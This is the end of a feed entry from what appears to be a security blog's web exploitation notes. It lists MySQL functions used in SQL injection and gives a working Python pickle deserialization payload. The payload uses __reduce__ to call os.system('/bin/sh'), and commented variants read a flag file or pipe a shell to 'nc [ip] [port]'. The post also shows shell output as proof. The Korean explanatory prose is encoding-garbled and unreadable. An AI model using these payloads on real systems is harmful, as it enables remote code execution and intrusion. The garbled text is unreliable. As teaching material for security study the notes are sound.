  <li><code class="language-plaintext highlighter-rouge">char(...)</code> : change integer arguments to char (ex. <code class="language-plaintext highlighter-rouge">char(0x61,0x62,0x63)</code>=&gt;<code class="language-plaintext highlighter-rouge">"abc"</code>)</li>
  <li><code class="language-plaintext highlighter-rouge">mid/substr[ing](a,b,c)</code> : get <code class="language-plaintext highlighter-rouge">c</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> from <code class="language-plaintext highlighter-rouge">b(starts from 1 ~ ..)</code></li>
  <li><code class="language-plaintext highlighter-rouge">left(a,b)</code> / <code class="language-plaintext highlighter-rouge">right(a,b)</code> : get <code class="language-plaintext highlighter-rouge">b</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> (begin / end(reverse but print correctly))</li>
  <li><code class="language-plaintext highlighter-rouge">version()</code> : get mysql version</li>
  <li><code class="language-plaintext highlighter-rouge">database()</code> : get current database</li>
</ul>

<p><br /></p>

<h2 id="python-pickle-deserialization">python pickle deserialization</h2>
<p><code class="language-plaintext highlighter-rouge">pickle</code>Î°ú ÏßÅÎ†¨ÌôîÎêú Í∞ùÏ≤¥Í∞Ä Î≥ÄÏ°∞ÎêòÏñ¥ Ïó≠ÏßÅÎ†¨ÌôîÌïòÎäî Í≥ºÏ†ïÏóêÏÑú ÏãúÏä§ÌÖúÏóê Ï†ëÍ∑ºÌïòÍ±∞ÎÇò ÏùòÎèÑÏπò ÏïäÏùÄ Í≤ÉÏù¥ Ïã§ÌñâÎêòÍ∏∞ÎèÑ ÌïúÎã§. ÏõêÌïòÎäî classÎ•º ÏÑ†Ïñ∏Ìïú Îí§, <code class="language-plaintext highlighter-rouge">__reduce__</code>Î•º ÌÜµÌïòÏó¨ <code class="language-plaintext highlighter-rouge">pickle.loads</code> Ìï®ÏàòÏóêÏÑú unpickle Ïãú <code class="language-plaintext highlighter-rouge">tuple</code>ÏùÑ Î∞òÌôòÌïòÏó¨ Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">pickle</span>

<span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="c1">#return (os.system, ('ls', ))
</span>    <span class="c1">#return (os.system, ('cat flag', ))
</span>    <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span> <span class="p">))</span>
    <span class="c1">#return (os.system, ('/bin/sh | nc [ip] [port]', ))
</span>
<span class="n">pickle_d</span><span class="o">=</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nf">payload</span><span class="p">())</span>
<span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">pickle_d</span><span class="p">)</span> <span class="c1"># get shell anyway
</span></code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</code></pre></div></div>

<p>update ÏòàÏ†ï.</p>]]></content><author><name>st4rlight (Ainsetin)</name></author><category term="note" /><summary type="html"><![CDATA[web exploitation note by using many ways]]></summary></entry></feed>